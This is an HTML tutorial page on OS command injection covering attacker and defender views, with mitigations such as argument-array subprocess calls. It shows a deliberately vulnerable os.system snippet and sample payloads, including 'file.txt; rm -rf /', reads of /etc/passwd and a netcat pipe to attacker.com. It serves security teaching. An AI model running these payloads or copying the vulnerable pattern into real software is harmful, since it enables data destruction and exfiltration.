<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Command Injection</title>
<style>
body {
    font-family: Arial, sans-serif;
    background: #f4f4f4 url('cloud.jpg') no-repeat top center;
    background-size: cover;
    padding: 20px;
    color: #111;
}

.card {
    background: white;
    border-radius: 12px;
    box-shadow: 0 8px 30px rgba(11,26,43,0.08);
    padding: 20px;
    margin-bottom: 20px;
    white-space: pre-wrap;
}

h2 {
    margin-top: 0;
}

code {
    background-color: #eee;
    padding: 2px 4px;
    border-radius: 4px;
}
</style>
</head>
<body>

<div class="card">
<h2>1. Overview:</h2>
Command injection occurs when untrusted user input is passed directly to a system shell or command interpreter. This allows attackers to execute arbitrary system commands on the host operating system. Unlike code injection (which targets the application runtime, e.g., Python, PHP), command injection specifically targets the OS layer.
</div>

<div class="card">
<h2>2. Vulnerability from an Attacker Perspective:</h2>
If an application takes user input and builds a command string without proper sanitization or parameterization, the attacker can "break out" of the intended command context and run arbitrary commands.

<b>Example:</b>

import os  
user_input = input("Enter filename: ")  
os.system(f"cat {user_input}")  

If the user types:  

file.txt; rm -rf /  

The attacker injects an additional command after the semicolon. The system executes both commands, potentially deleting all files.

<b>Impact:</b>  
- File disclosure: Access sensitive files like /etc/passwd.  
- File modification/deletion: Corrupt or destroy data.  
- Remote access: Install backdoors or launch reverse shells.  
- Privilege escalation: If the application runs as root/admin, full system compromise.  
- Pivoting: Move laterally to other systems.  
</div>

<div class="card">
<h2>2.1 Attempts of an Attacker:</h2>
Attackers often try special characters or separators to inject extra commands:

- `;` → Run another command.  
- `&&` → Run next command only if previous succeeds.  
- `||` → Run next command only if previous fails.  
- `|` → Pipe output to another command.  
- Backticks or $() → Command substitution.  

<b>Example payloads:</b>  
- `test.txt; whoami`  
- `test.txt && id`  
- `test.txt | nc attacker.com 4444`  
- `$(cat /etc/passwd)`  

Once a foothold is gained, attackers can combine OS commands to exfiltrate data, establish persistence, or escalate privileges.
</div>

<div class="card">
<h2>3. Vulnerability from a Defender Perspective:</h2>
<b>Why it happens:</b>  
- Direct concatenation of user input into system commands.  
- Lack of input validation/sanitization.  
- Using functions like `system()`, `exec()`, `popen()` unsafely.  

<b>Mitigation strategies:</b>  
- Never trust user input. Validate type, length, and format.  
- Use safe APIs (parameterized system calls).  
- Avoid passing user input into a shell; use functions that take arguments as arrays (e.g., `subprocess.run(["cat", filename])` in Python).  
- Apply allowlists: Only accept known-good inputs (e.g., filenames from a safe directory).  
- Use least privilege: Run applications with minimal OS rights.  
- Monitor and log unusual command executions.  
</div>

<div class="card">
<h2>4. Extras:</h2>
<b>Command Injection vs Code Injection:</b>  

- Command Injection → attacker executes OS-level commands (system()).  
- Code Injection → attacker executes code within the app runtime (eval, exec in Python).  

Command Injection = “talking to the OS.”  
Code Injection = “becoming the app itself.”  
</div>

</body>
</html>
